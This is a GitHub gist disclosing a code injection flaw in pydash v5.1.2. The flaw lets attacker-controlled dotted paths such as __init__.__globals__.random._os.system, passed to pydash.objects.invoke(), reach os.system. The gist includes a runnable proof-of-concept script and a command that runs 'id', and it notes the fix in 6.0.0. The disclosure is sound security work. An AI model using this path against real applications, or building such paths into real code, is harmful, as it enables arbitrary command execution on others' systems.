
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F45d33e9ea55bf4953b3b31c84703dfca)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F45d33e9ea55bf4953b3b31c84703dfca&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F45d33e9ea55bf4953b3b31c84703dfca) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F45d33e9ea55bf4953b3b31c84703dfca&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@CalumHutton](https://avatars.githubusercontent.com/u/89394440?s=64&v=4)](/CalumHutton)

# [CalumHutton](/CalumHutton)/**[pydash.md](/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca)** Secret

Last active
September 15, 2023 16:44

Show Gist options

* [Download ZIP](/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca/archive/3bcb82aee1a11c9355739beed8adf665aea1a088.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F45d33e9ea55bf4953b3b31c84703dfca)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F45d33e9ea55bf4953b3b31c84703dfca)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca.js&quot;&gt;&lt;/script&gt;
* Save CalumHutton/45d33e9ea55bf4953b3b31c84703dfca to your computer and use it in GitHub Desktop.

[Code](/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca)
[Revisions
4](/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca.js&quot;&gt;&lt;/script&gt;

Save CalumHutton/45d33e9ea55bf4953b3b31c84703dfca to your computer and use it in GitHub Desktop.

[Download ZIP](/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca/archive/3bcb82aee1a11c9355739beed8adf665aea1a088.zip)

pydash v5.1.2 Code Injection

 [Raw](/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca/raw/3bcb82aee1a11c9355739beed8adf665aea1a088/pydash.md)

[**pydash.md**](#file-pydash-md)

## pydash v5.1.2 Code Injection

### Disclosure Status

I have already disclosed this to the maintainer, who issued a fix in version 6.0.0 (<https://pypi.org/project/pydash/6.0.0/>). I'd like to request a CVE be assigned for this vulnerability.

### Technical Details:

A number of pydash methods accept dotted paths (Deep Path Strings) to target a nested Python object, relative to the original source object. These paths can be used to target internal class attributes and dict items, to retrieve, modify or invoke nested Python objects.

From my research I have identified that the `pydash.objects.invoke()` method (<https://pydash.readthedocs.io/en/latest/api.html#pydash.objects.invoke>) is vulnerable to Command Injection when the following prerequisites are satisfied:

1. The source object (argument 1) is not a built-in object such as list/dict (otherwise, the `__init__.__globals__` path is not accessible)
2. The attacker has control over argument 2 (the path string) and argument 3 (the argument to pass to the invoked method)

When these prerequisites are met, the attacker can pass an arbitrary path i.e. `__init__.__globals__.random._os.system` to call `os.system()` with an attacker supplied argument i.e. 'id'.

To a lesser extent, the `pydash.collections.invoke_map()` method is also vulnerable, but is harder to exploit as the attacker does not have direct control over the argument to be passed to the invoked function. If it was possible to manipulate the collection to contain an attacker controlled value, Command Injection is likely also possible.

### Proof Of Concept/Steps to Reproduce:

The PoC script below demonstrates this issue, run the script with a malicious dotted path and the string argument to be passed to the invoked function i.e: `python pdash.py __init__.__globals__.random._os.system id`

```
import sys
import random

import pydash

class Animal:
    def __init__(self, typ, age):
        self.type = typ
        self.age = age
        self.id = random.randint(1, 99999)

def poc(path, arg):
    """
        Use a malicious path to execute code via the __init__.__globals__ dict (not available with dict/list input objects?)
        I.e: pydash.invoke(obj, '__init__.__globals__.random._os.system', 'id')
    """

    obj = Animal('cat', 11)
    res = pydash.invoke(obj, path, arg)
    print(res)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Missing args: %s <path> <arg>' % sys.argv[0])
        sys.exit(1)
    poc(sys.argv[1], sys.argv[2])
```

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F45d33e9ea55bf4953b3b31c84703dfca)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

